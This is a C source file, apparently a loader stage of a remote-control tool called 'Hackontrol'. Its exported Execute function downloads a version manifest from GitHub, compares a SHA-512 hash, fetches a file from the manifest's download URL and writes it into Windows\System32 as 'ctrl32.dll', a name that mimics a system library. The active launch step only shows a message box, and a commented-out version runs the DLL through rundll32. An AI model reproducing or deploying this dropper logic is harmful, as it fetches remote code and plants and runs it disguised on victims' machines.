#include "definition.h"
#include <cJSON.h>

#define FILE_NAME_PATH L"System32\\ctrl32.dll"

void executeProgram();

static size_t write_data(BYTE* data, size_t size, size_t count, void** dataPointer) {
	if(!dataPointer) {
		return 0;
	}

	BYTE* outputBuffer = *dataPointer;
	size_t length = size * count;

	if(!outputBuffer) {
		BYTE* result = malloc(length + 1);

		if(!result) {
			dialogError(ERROR_OUTOFMEMORY, L"malloc");
			return 0;
		}

		for(size_t i = 0; i < length; i++) {
			result[i] = data[i];
		}

		result[length] = 0;
		*dataPointer = result;
		return length;
	}

	size_t previousLength = strlen(outputBuffer);
	size_t resultLength = previousLength + length;
	BYTE* result = malloc(resultLength + 1);

	if(!result) {
		dialogError(ERROR_OUTOFMEMORY, L"malloc");
		return 0;
	}

	for(size_t i = 0; i < previousLength; i++) {
		result[i] = outputBuffer[i];
	}

	free(outputBuffer);

	for(size_t i = 0; i < length; i++) {
		result[i + previousLength] = data[i];
	}

	result[resultLength] = 0;
	*dataPointer = result;
	return length;
}

static size_t write_data_file(void* data, size_t size, size_t count, FILE* stream) {
	return fwrite(data, size, count, stream);
}

EXPORT(Execute) {
	UINT directoryLength = GetWindowsDirectoryW(NULL, 0);

	if(!directoryLength) {
		dialogError(GetLastError(), L"GetWindowsDirectoryW");
		return;
	}

	wchar_t* windowsBuffer = malloc(directoryLength * sizeof(wchar_t));

	if(!windowsBuffer) {
		dialogError(ERROR_OUTOFMEMORY, L"malloc");
		return;
	}

	directoryLength = GetWindowsDirectoryW(windowsBuffer, directoryLength);

	if(!directoryLength) {
		dialogError(GetLastError(), L"GetWindowsDirectoryW");
		free(windowsBuffer);
		return;
	}

	size_t fileNameLength = wcslen(FILE_NAME_PATH);
	int notEndWithBackslash = windowsBuffer[directoryLength - 1] != L'\\';
	size_t fileNameBufferSize = directoryLength + fileNameLength + notEndWithBackslash + 1;
	wchar_t* fileNameBuffer = malloc(fileNameBufferSize * sizeof(wchar_t));

	if(!fileNameBuffer) {
		dialogError(ERROR_OUTOFMEMORY, L"malloc");
		free(windowsBuffer);
		return;
	}

	for(size_t i = 0; i < directoryLength; i++) {
		fileNameBuffer[i] = windowsBuffer[i];
	}

	free(windowsBuffer);

	if(notEndWithBackslash) {
		fileNameBuffer[directoryLength] = L'\\';
	}

	for(size_t i = 0; i < fileNameLength; i++) {
		fileNameBuffer[i + directoryLength + notEndWithBackslash] = FILE_NAME_PATH[i];
	}

	fileNameBuffer[fileNameBufferSize - 1] = 0;
	CURLcode code = curl_global_init(CURL_GLOBAL_ALL);

	if(code != CURLE_OK) {
		curlError(code, L"curl_global_init");
		goto freeFileNameBuffer;
	}

	CURL* curl = curl_easy_init();

	if(!curl) {
		curlError(code, L"curl_easy_init");
		goto globalCleanup;
	}

	code = curl_easy_setopt(curl, CURLOPT_URL, "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/version.json");

	if(code != CURLE_OK) {
		curlError(code, L"curl_easy_setopt");
		goto easyCleanup;
	}

	code = curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);

	if(code != CURLE_OK) {
		curlError(code, L"curl_easy_setopt");
		goto easyCleanup;
	}

	void* versionFile = NULL;
	code = curl_easy_setopt(curl, CURLOPT_WRITEDATA, &versionFile);

	if(code != CURLE_OK) {
		curlError(code, L"curl_easy_setopt");
		goto easyCleanup;
	}

	code = curl_easy_perform(curl);

	if(code != CURLE_OK) {
		curlError(code, L"curl_easy_perform");
		goto easyCleanup;
	}

	if(!versionFile) {
		MessageBoxW(NULL, L"Empty version file buffer", L"Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		goto easyCleanup;
	}

	cJSON* rootJson = cJSON_Parse(versionFile);
	free(versionFile);

	if(!rootJson) {
		MessageBoxW(NULL, L"JSON parsing error", L"Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		goto easyCleanup;
	}

	cJSON* hashObject = cJSON_GetObjectItem(rootJson, "hash");

	if(!hashObject) {
		MessageBoxW(NULL, L"JSON field 'hash' not found", L"Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		goto deleteJson;
	}

	char* sourceHash = cJSON_GetStringValue(hashObject);

	if(!sourceHash) {
		MessageBoxW(NULL, L"JSON field 'hash' is not a string", L"Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		goto deleteJson;
	}

	HANDLE fileHandle = CreateFileW(fileNameBuffer, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if(fileHandle == INVALID_HANDLE_VALUE) {
		dialogError(GetLastError(), L"CreateFileW");
		goto deleteJson;
	}

	LARGE_INTEGER integer;

	if(!GetFileSizeEx(fileHandle, &integer)) {
		dialogError(GetLastError(), L"GetFileSizeEx");

		if(!CloseHandle(fileHandle)) {
			dialogError(GetLastError(), L"CloseHandle");
		}

		goto deleteJson;
	}

	BYTE* dataBuffer = malloc(integer.QuadPart);

	if(!dataBuffer) {
		dialogError(ERROR_OUTOFMEMORY, L"malloc");

		if(!CloseHandle(fileHandle)) {
			dialogError(GetLastError(), L"CloseHandle");
		}

		goto deleteJson;
	}

	DWORD bytesRead = 0;

	if(!ReadFile(fileHandle, dataBuffer, (DWORD) integer.QuadPart, &bytesRead, NULL)) {
		dialogError(GetLastError(), L"ReadFile");
		free(dataBuffer);

		if(!CloseHandle(fileHandle)) {
			dialogError(GetLastError(), L"CloseHandle");
		}

		goto deleteJson;
	}

	char* hash = hashSHA512(dataBuffer, bytesRead);
	free(dataBuffer);

	if(!hash) {
		if(!CloseHandle(fileHandle)) {
			dialogError(GetLastError(), L"CloseHandle");
		}

		goto deleteJson;
	}

	if(strcmp(hash, sourceHash) == 0) {
		free(hash);
		executeProgram();

		if(!CloseHandle(fileHandle)) {
			dialogError(GetLastError(), L"CloseHandle");
		}

		goto deleteJson;
	}

	free(hash);

	if(!CloseHandle(fileHandle)) {
		dialogError(GetLastError(), L"CloseHandle");
		goto deleteJson;
	}
	
	cJSON* downloadObject = cJSON_GetObjectItem(rootJson, "download");

	if(!downloadObject) {
		MessageBoxW(NULL, L"JSON field 'download' not found", L"Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		goto deleteJson;
	}

	char* downloadURL = cJSON_GetStringValue(downloadObject);
	
	if(!downloadURL) {
		MessageBoxW(NULL, L"JSON field 'download' is not a string", L"Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		goto deleteJson;
	}

	code = curl_easy_setopt(curl, CURLOPT_URL, downloadURL);

	if(code != CURLE_OK) {
		curlError(code, L"curl_easy_setopt");
		goto deleteJson;
	}

	code = curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data_file);

	if(code != CURLE_OK) {
		curlError(code, L"curl_easy_setopt");
		goto deleteJson;
	}

	FILE* file = NULL;
	errno_t errorCode = _wfopen_s(&file, fileNameBuffer, L"wb");

	if(errorCode != 0 || file == NULL) {
		dialogError(errorCode, L"_wfopen_s");
		goto deleteJson;
	}

	code = curl_easy_setopt(curl, CURLOPT_WRITEDATA, file);

	if(code != CURLE_OK) {
		curlError(code, L"curl_easy_setopt");
		goto closeFile;
	}

	code = curl_easy_perform(curl);

	if(code != CURLE_OK) {
		curlError(code, L"curl_easy_perform");
		goto closeFile;
	}

	executeProgram();
closeFile:
	fclose(file);
deleteJson:
	cJSON_Delete(rootJson);
easyCleanup:
	curl_easy_cleanup(curl);
globalCleanup:
	curl_global_cleanup();
freeFileNameBuffer:
	free(fileNameBuffer);
}

void executeProgram() {
	MessageBoxW(NULL, L"Execute Program", L"Information", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
}

/*void executeProgram() {
	STARTUPINFO startupInformation = {0};
	startupInformation.cb = sizeof(STARTUPINFO);
	PROCESS_INFORMATION processInformation = {0};
	const wchar_t* rundll32 = HU_GetSystemDirectory(L"rundll32.exe");
	std::wstring argument(rundll32);
	argument += L" ";
	argument += FILE_NAME;
	argument += L",Execute";
	wchar_t* programArgument = const_cast<wchar_t*>(argument.c_str());

	if(CreateProcessW(rundll32, programArgument, NULL, NULL, TRUE, NULL, NULL, NULL, &startupInformation, &processInformation) == NULL) {
		HU_DisplayError(GetLastError(), L"CreateProcessW()");
		return;
	}

	if(CloseHandle(processInformation.hProcess) == NULL) {
		HU_DisplayError(GetLastError(), L"CloseHandle()");
		return;
	}

	if(CloseHandle(processInformation.hThread) == NULL) {
		HU_DisplayError(GetLastError(), L"CloseHandle()");
	}
}*/